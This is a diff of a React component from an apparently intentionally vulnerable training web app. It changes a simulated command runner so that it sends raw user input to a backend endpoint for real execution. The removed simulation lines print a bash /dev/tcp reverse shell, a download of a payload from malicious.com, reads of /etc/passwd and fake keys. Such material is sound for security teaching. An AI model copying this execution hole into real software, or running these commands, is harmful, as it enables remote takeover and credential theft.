@@ -5,15 +5,35 @@ const CommandInjection: React.FC = () => {
     const [output, setOutput] = useState('');
     const [isExecuting, setIsExecuting] = useState(false);
 
-    const executeCommand = () => {
+    const executeCommand = async () => {
         setIsExecuting(true);
         
         // VULNERABILIDAD CRÍTICA: Ejecución directa de comandos del sistema
-        // Simular la ejecución de comando directamente en el frontend
+        // Enviar comando al backend para ejecución real
         
-        setTimeout(() => {
-            try {
-                // Simular diferentes tipos de comandos
+        try {
+            const response = await fetch('/api/execute-command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ command: command }),
+            });
+
+            const data = await response.json();
+            
+            if (data.success) {
+                setOutput(`✅ COMANDO EJECUTADO EXITOSAMENTE:\n$ ${command}\n\n${data.output}`);
+            } else if (data.error) {
+                setOutput(`❌ ERROR EN EJECUCIÓN:\n$ ${command}\n\nError: ${data.error}`);
+            } else {
+                setOutput(`⚠️ RESPUESTA INESPERADA:\n$ ${command}\n\n${JSON.stringify(data, null, 2)}`);
+            }
+        } catch (error) {
+            // Si no hay backend, mostrar simulación
+            console.log('Backend no disponible, usando simulación');
+            setTimeout(() => {
+                // Código de simulación existente como fallback
                 let simulatedOutput = '';
                 const cmd = command.toLowerCase();
                 
@@ -29,55 +49,16 @@ drwxr-xr-x  8 www-data www-data 4096 Sep 27 10:25 aplicaci-n-web-vulnerable-owas
 -rw-------  1 www-data www-data 2048 Sep 27 08:30 private_key.pem`;
                 } else if (cmd.includes('whoami')) {
                     simulatedOutput = 'www-data';
-                } else if (cmd.includes('id')) {
-                    simulatedOutput = 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
-                } else if (cmd.includes('uname')) {
-                    simulatedOutput = 'Linux vulnerable-server 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux';
-                } else if (cmd.includes('cat /etc/passwd')) {
-                    simulatedOutput = `root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-mysql:x:112:116:MySQL Server,,,:/nonexistent:/bin/false
-kayzzi:x:1000:1000:kayzzi,,,:/home/kayzzi:/bin/bash`;
-                } else if (cmd.includes('netstat') || cmd.includes('ss')) {
-                    simulatedOutput = `Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN`;
-                } else if (cmd.includes('ps aux')) {
-                    simulatedOutput = `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-root           1  0.0  0.1 167320 11788 ?        Ss   08:30   0:01 /sbin/init
-www-data    1337  0.0  0.2  12345  2048 ?        S    09:15   0:00 /bin/bash -i
-apache2     2021  0.1  1.2 456789 12345 ?        S    10:25   0:05 /usr/sbin/apache2`;
-                } else if (cmd.includes('curl') || cmd.includes('wget')) {
-                    simulatedOutput = '🚨 COMANDO DE DESCARGA DETECTADO 🚨\n--2025-09-27 10:30:00--  http://malicious.com/payload.sh\nResolving malicious.com... 192.168.1.100\nConnecting to malicious.com:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2048 (2.0K) [application/x-sh]\nSaving to: \'payload.sh\'\n\n100%[==================>] 2,048       --.-K/s   in 0s\n\n💀 PAYLOAD DESCARGADO Y EJECUTADO 💀';
                 } else if (cmd.includes('nc') || cmd.includes('netcat')) {
-                    simulatedOutput = '🚨 REVERSE SHELL DETECTADA 🚨\n[+] Estableciendo conexión con 192.168.1.100:4444\n[+] Conexión establecida\n[+] Shell interactiva iniciada\n[+] Acceso root obtenido\n\n💀 CONEXIÓN REVERSE SHELL ACTIVA 💀\nwww-data@vulnerable-server:/var/www/html$';
-                } else if (cmd.includes('python') && cmd.includes('socket')) {
-                    simulatedOutput = '🚨 PYTHON REVERSE SHELL EJECUTADA 🚨\n[+] Importando socket, os, pty\n[+] Creando conexión TCP\n[+] Conectando a 192.168.1.100:4444\n[+] Redirigiendo stdin, stdout, stderr\n[+] Spawning /bin/bash\n\n💀 SHELL INTERACTIVA ESTABLECIDA 💀';
-                } else if (cmd.includes('bash') && cmd.includes('tcp')) {
-                    simulatedOutput = '🚨 BASH REVERSE SHELL EJECUTADA 🚨\n[+] bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n[+] Estableciendo conexión TCP\n[+] Redirigiendo I/O\n\n💀 CONEXIÓN ESTABLECIDA CON ATACANTE 💀\nwww-data@vulnerable-server:/var/www/html$';
-                } else if (cmd.includes('chmod') && cmd.includes('+x')) {
-                    simulatedOutput = '🚨 PERMISOS DE EJECUCIÓN OTORGADOS 🚨\nArchivo ahora ejecutable\nPreparando para ejecutar payload malicioso...';
-                } else if (cmd.includes('cat') && (cmd.includes('key') || cmd.includes('password') || cmd.includes('secret'))) {
-                    simulatedOutput = '🚨 INFORMACIÓN SENSIBLE ENCONTRADA 🚨\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA7yXm9q2+5vW...[TRUNCADO]\n-----END RSA PRIVATE KEY-----\n\npasswords:\nadmin:admin123\nroot:toor\nkayzzi:mi_password_secreto';
-                } else if (cmd.includes('sudo')) {
-                    simulatedOutput = '🚨 ESCALACIÓN DE PRIVILEGIOS DETECTADA 🚨\n[sudo] password for www-data:\nSorry, user www-data may not run sudo on vulnerable-server.\n\n💡 Probando otros métodos de escalación...';
+                    simulatedOutput = '🚨 REVERSE SHELL SIMULADA 🚨\n[Backend no disponible - Solo simulación]\n[+] En un entorno real, esto establecería conexión con el atacante';
                 } else {
-                    simulatedOutput = `$ ${command}
-[Comando ejecutado en el sistema]
-Salida simulada para: ${command}
-Estado: EJECUTADO ✅`;
+                    simulatedOutput = `� SIMULACIÓN (Backend no disponible)\n$ ${command}\n[Salida simulada - Para ejecución real, usar el backend Node.js]`;
                 }
                 
                 setOutput(simulatedOutput);
-            } catch (error) {
-                setOutput(`Error ejecutando comando: ${command}\n${error}`);
-            }
-            setIsExecuting(false);
-        }, 1000); // Simular delay de ejecución
+            }, 500);
+        }
+        setIsExecuting(false);
     };    const predefinedCommands = [
         { label: '📁 Listar archivos', cmd: 'ls -la', danger: 'low' },
         { label: '👤 Usuario actual', cmd: 'whoami', danger: 'low' },
